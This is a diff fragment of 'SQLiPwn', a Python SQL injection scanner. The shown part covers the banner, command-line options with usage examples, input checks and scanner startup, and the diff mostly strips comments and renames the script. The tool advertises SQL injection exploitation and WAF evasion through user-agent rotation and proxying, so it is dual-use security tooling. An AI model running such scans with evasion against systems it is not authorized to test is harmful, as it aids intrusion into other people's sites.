             else:
                 print(f"\n{Fore.GREEN}{'='*60}")
                 print(f"{Fore.GREEN}SECURITY STATUS: No SQL injection vulnerabilities detected!")
@@ -1573,7 +1568,7 @@ class SQLiPwnScanner:
                 pass
     
     def _test_endpoint_with_progress(self, url: str, params: Dict[str, List[str]], endpoint_num: int, total_endpoints: int) -> List[VulnerableEndpoint]:
-        """Test endpoint with progress tracking and error handling"""
+
         try:
             return self.tester.test_endpoint(url, params)
         except Exception as e:
@@ -1581,7 +1576,6 @@ class SQLiPwnScanner:
             return []
 
 def print_sqlipwn_banner():
-    """Display enhanced SQLiPwn banner"""
     banner = f"""
 {Fore.RED}   ____   ___  _     _   ____                  
 {Fore.RED}  / ___| / _ \\| |   (_) |  _ \\ __      ___ __   
@@ -1590,7 +1584,7 @@ def print_sqlipwn_banner():
 {Fore.RED}  |____/ \\___/|_____|_| |_|     \\_/\\_/ |_| |_| 
 {Fore.RED}                                               
 {Fore.RED}  SQLiPwn - Advanced SQL Injection Scanner v2.1
-{Fore.RED}  Professional-grade SQL injection detection and exploitation
+{Fore.RED}  SQL injection detection and exploitation
 {Fore.RED}  Multi-threading | Authentication | Professional Reports
 {Fore.CYAN}  
 {Fore.CYAN}  Created by: syfi
@@ -1600,7 +1594,6 @@ def print_sqlipwn_banner():
     print(banner)
 
 def main():
-    """Enhanced main application entry point"""
     
     print_sqlipwn_banner()
     
@@ -1610,22 +1603,22 @@ def main():
         epilog="""
 USAGE EXAMPLES:
   Basic scan:
-    python zql.py -u https://example.com
+    python sqlipwn.py -u https://example.com
 
   Fast scan (reduced payloads):
-    python zql.py -u https://example.com --fast
+    python sqlipwn.py -u https://example.com --fast
 
   Authenticated scan with session cookies:
-    python zql.py -u https://app.com --cookies "session=abc123; token=xyz789"
+    python sqlipwn.py -u https://app.com --cookies "session=abc123; token=xyz789"
 
   Thorough scan with WAF evasion and Burp Suite proxy:
-    python zql.py -u https://example.com --thorough --random-user-agent --proxy http://127.0.0.1:8080
+    python sqlipwn.py -u https://example.com --thorough --random-user-agent --proxy http://127.0.0.1:8080
 
   Deep crawl with custom headers:
-    python zql.py -u https://api.example.com -d 5 --headers "Authorization: Bearer token123"
+    python sqlipwn.py -u https://api.example.com -d 5 --headers "Authorization: Bearer token123"
 
   Multi-threaded scan with custom timing:
-    python zql.py -u https://example.com -t 20 --delay 0.2 --timeout 15
+    python sqlipwn.py -u https://example.com -t 20 --delay 0.2 --timeout 15
 
 SCAN MODES:
   --fast      : Reduced payloads for speed (recommended for time-limited scans)
@@ -1646,7 +1639,7 @@ Created by syfi for authorized security testing
         """
     )
     
-    # Essential arguments
+    # arguments
     parser.add_argument('-u', '--url', required=True, 
                        help='Target URL to scan (required)')
     parser.add_argument('-d', '--depth', type=int, default=3, 
@@ -1676,7 +1669,6 @@ Created by syfi for authorized security testing
     scan_group.add_argument('--thorough', action='store_true', 
                            help='Thorough scan mode (extended payloads + WAF evasion)')
     
-    # Evasion and proxy options
     evasion_group = parser.add_argument_group('Evasion & Proxy Options')
     evasion_group.add_argument('--random-user-agent', action='store_true', 
                               help='Use random user agent rotation for evasion')
@@ -1685,10 +1677,9 @@ Created by syfi for authorized security testing
     
     args = parser.parse_args()
     
-    # Enhanced input validation
     if not args.url.startswith(('http://', 'https://')):
         print(f"{Fore.RED}[!] Error: URL must start with http:// or https://")
-        print(f"{Fore.YELLOW}[*] Example: python zql.py -u https://example.com")
+        print(f"{Fore.YELLOW}[*] Example: python sqlipwn.py -u https://example.com")
         sys.exit(1)
     
     if args.threads < 1 or args.threads > 50:
@@ -1710,7 +1701,6 @@ Created by syfi for authorized security testing
         sys.exit(1)
     
     try:
-        # Enhanced header parsing
         custom_headers = {}
         if args.headers:
             try:
@@ -1723,10 +1713,10 @@ Created by syfi for authorized security testing
                 print(f"{Fore.RED}[!] Error parsing headers: {e}")
                 sys.exit(1)
         
-        # Determine cookie source
+        #  cookie source
         cookie_source = args.cookies or args.cookie_file
         
-        # Enhanced configuration display
+        # configuration display
         print(f"\n{Fore.CYAN}SCAN CONFIGURATION:")
         print(f"{Fore.CYAN}{'='*50}")
         print(f"{Fore.CYAN}Target URL      : {args.url}")
@@ -1748,14 +1738,12 @@ Created by syfi for authorized security testing
         
         print(f"{Fore.CYAN}{'='*50}")
         
-        # Confirmation prompt for destructive scans
         if args.thorough and args.threads > 20:
             response = input(f"\n{Fore.YELLOW}[?] High-intensity scan detected. Continue? (y/N): ")
             if response.lower() != 'y':
                 print(f"{Fore.YELLOW}[*] Scan cancelled by user")
                 sys.exit(0)
         
-        # Initialize scanner with enhanced configuration
         scanner = SQLiPwnScanner(
             target_url=args.url,
             max_depth=args.depth,
@@ -1779,7 +1767,7 @@ Created by syfi for authorized security testing
         scanner.scan()
         
         print(f"\n{Fore.GREEN}[+] SQLiPwn scan completed successfully!")
-        print(f"{Fore.CYAN}[*] Thank you for using SQLiPwn by syfi")
+        print(f"{Fore.CYAN}[*] x.com/syfi2k")
         
     except KeyboardInterrupt:
         print(f"\n{Fore.YELLOW}[!] Scan interrupted by user")
